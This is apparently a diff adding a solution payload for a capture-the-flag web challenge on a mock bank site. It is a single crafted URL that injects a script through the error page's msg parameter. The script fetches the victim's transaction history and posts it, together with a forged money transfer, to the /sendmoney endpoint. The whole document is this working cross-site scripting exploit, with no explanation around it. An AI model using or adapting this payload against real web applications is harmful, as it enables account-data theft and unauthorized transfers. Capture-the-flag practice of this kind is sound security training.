@@ -1,0 +1,13 @@
+http://virtualbank.challs.olicyber.it/error/?msg=<body><script src='/error/?msg=
+var x = new XMLHttpRequest();
+x.open("GET", "/history", false);
+x.send();
+var pagina = x.responseText;
+var y = new XMLHttpRequest();
+y.open("POST", "/sendmoney", false);
+var data = new URLSearchParams();
+data.append("to", "yomama");
+data.append("amount", "1");
+data.append("description", pagina);
+y.send(data);
+'></script>
